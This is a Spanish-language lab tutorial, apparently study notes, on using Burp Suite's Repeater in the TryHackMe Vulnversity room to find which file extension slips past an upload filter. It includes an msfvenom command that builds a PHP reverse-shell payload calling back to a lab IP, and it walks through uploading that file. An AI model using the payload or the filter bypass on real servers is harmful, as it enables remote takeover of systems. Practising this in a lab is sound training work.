# Burp Suite – Uso del Repeater

Maquinas a utilizar **Kali Linux y  Laboratorio de Try Hack Me  Vulnversity**  https://tryhackme.com/room/vulnversity

Una vez hayamos interceptado una petición HTTP con burp suite, es posible que necesitemos realizar diversas comprobaciones dentro de una petición para encontrar la vulnerabilidad; y para ello disponemos del **repeater**. De tal forma que podremos modificar de forma cómoda las peticiones e ir enviándolas al servidor web para analizar sus respuestas.

- Vamos a aplicar antes de nada un pequeño ajuste dentro del navegador web.
    
    **Ajustes → Settings**
    
    **General→ Network Settings**
    
    **Manual proxy configuration**
    
    **HTTP Proxy: 127.0.0.1  Port: 8080**
    
- Activamos la interceptación en BurpSuite
    
    **Proxy → intercept on**
    
- Subimos el archivo malicioso que habíamos creado con el siguiente comando:
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned2.php 
    ```
    
    ![image.png](./imagenes/image%20114.png)
    
    ![image.png](./imagenes/image%20115.png)
    

- **¿Qué pasaría si no se que extensión poner al archivo?**
    
    ![image.png](./imagenes/image%20116.png)
    

- Para eso tenemos la opción de **Repeater.** Tenemos dos formas de acceder a Repeater.
    1. Haciendo un **clip derecho** y pulsar en **Send to Repeter**.
        
        ![image.png](./imagenes/image%20117.png)
        

1. Pulsando **CTRL+R**

- Haciendo esto hemos enviado la petición al apartado Repeater.
    
    ![image.png](./imagenes/image%20118.png)
    
    Si cambiar nada pulsamos enviamos la petición pulsando  el botón **Send,** vemos que nos llega la respuesta. Y podemos observar que nos devuelve Extensión no permitida.
    
    ![image.png](./imagenes/image%20119.png)
    

Podemos ir probando distintas extensiones y ver si la respuesta cambia. Por ejemplo vamos a ponerle extensión TXT la enviamos.

![image.png](./imagenes/image%20120.png)

Lo interesante aquí es **probar extensión por extensión hasta acertar**.

![image.png](./imagenes/image%20121.png)

Aquí lo hemos hecho con extensiones pero podríamos probar con cualquier parámetro de la petición hasta acertar que nos permita el cambio.

- Nos vamos al **apartado de proxy** le ponemos la **extensión correcta** que hemos averiguado con el Repeater y le daríamos a **Forward.**